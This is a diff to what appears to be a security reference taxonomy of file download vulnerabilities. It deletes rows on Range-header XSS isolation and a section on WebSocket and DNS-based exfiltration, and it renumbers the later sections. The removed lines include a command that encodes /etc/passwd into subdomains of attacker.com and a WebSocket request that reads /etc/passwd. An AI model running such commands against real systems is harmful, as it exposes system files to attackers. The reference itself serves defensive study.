@@ -23,7 +23,7 @@ File download vulnerabilities arise when an application exposes a mechanism for 
 | **Temporal Race** | Exploiting time-of-check-to-time-of-use gaps in file operations |
 | **Information Leakage** | Accessing exposed artifacts (backups, configs, VCS) through predictable or discoverable paths |
 
-**Axis 3 (Deployment): Attack Scenario** — the architectural context determining impact (§9).
+**Axis 3 (Deployment): Attack Scenario** — the architectural context determining impact (§8).
 
 ---
 
@@ -265,35 +265,11 @@ HTTP Range headers enable partial content retrieval, which can be abused in spec
 | Subtype | Mechanism | Example | Key Condition |
 |---------|-----------|---------|---------------|
 | **Byte-at-a-Time Extraction** | Request one byte at a time to bypass content inspection | `Range: bytes=0-0`, `Range: bytes=1-1`, ... reassembled client-side | DLP/content filter only inspects complete responses |
-| **Range-Based XSS Isolation** | Isolate reflected XSS payload using Range header to strip surrounding safe content | `Range: bytes=1337-1400` returns only the reflected script tag | Server supports Range on dynamic content; no `X-Content-Type-Options` |
 | **Multi-Range Information Disclosure** | Multipart range response reveals internal boundaries and content structure | `Range: bytes=0-10, 1000-1010` returns `multipart/byteranges` with boundary metadata | Server processes arbitrary Range combinations |
 
 ---
 
-## §8. WebSocket and Alternative Channel Exfiltration
-
-File access through non-HTTP channels can bypass traditional web security controls.
-
-### §8-1. WebSocket File Access
-
-| Subtype | Mechanism | Example | Key Condition |
-|---------|-----------|---------|---------------|
-| **Cross-Site WebSocket Hijacking (CSWSH)** | Attacker's page establishes WebSocket to target; reads file data from streamed responses | Victim visits attacker page → WS connects to `wss://target/ws` → exfiltrates file data | WebSocket endpoint accepts any Origin; authentication via cookies only |
-| **WebSocket Smuggling** | Exploit WebSocket upgrade handshake mismatch to smuggle HTTP requests accessing files | Front-end proxy upgrades to WS; attacker sends raw HTTP via WS tunnel to access internal file endpoints | Proxy and backend disagree on WebSocket upgrade completion |
-| **Unauthenticated WS File Access** | WebSocket server exposes file read capabilities without authentication | Connect to `ws://localhost:PORT` → send `{"cmd": "readFile", "path": "/etc/passwd"}` | WS server binds to localhost but no auth (CVE-2025-52882 pattern) |
-
-### §8-2. DNS-Based File Exfiltration
-
-When direct HTTP response is not available (blind file read), DNS can be used as an out-of-band channel.
-
-| Subtype | Mechanism | Example | Key Condition |
-|---------|-----------|---------|---------------|
-| **DNS Rebinding for Local File Access** | DNS rebinding bypasses SOP; attacker script reads local files after rebinding | DNS resolves to attacker IP → loads JS → DNS rebinds to `127.0.0.1` → script reads local file endpoint | Target service on localhost serves files; no CORS/SOP-aware authentication |
-| **OOB Data via DNS Queries** | Encode file contents as DNS subdomain labels | `$(cat /etc/passwd | base64 | head -c 60).attacker.com` | Blind file read primitive + DNS resolution from target |
-
----
-
-## §9. Attack Scenario Mapping (Axis 3)
+## §8. Attack Scenario Mapping (Axis 3)
 
 | Scenario | Architecture / Precondition | Primary Mutation Categories | Impact |
 |----------|---------------------------|---------------------------|--------|
@@ -308,7 +284,7 @@ When direct HTTP response is not available (blind file read), DNS can be used as
 
 ---
 
-## §10. CVE / Bounty Mapping (2024–2025)
+## §9. CVE / Bounty Mapping (2024–2025)
 
 | Mutation Combination | CVE / Case | Impact / Bounty |
 |---------------------|-----------|----------------|
@@ -326,7 +302,7 @@ When direct HTTP response is not available (blind file read), DNS can be used as
 
 ---
 
-## §11. Detection Tools
+## §10. Detection Tools
 
 | Tool | Target Scope | Core Technique |
 |------|-------------|---------------|
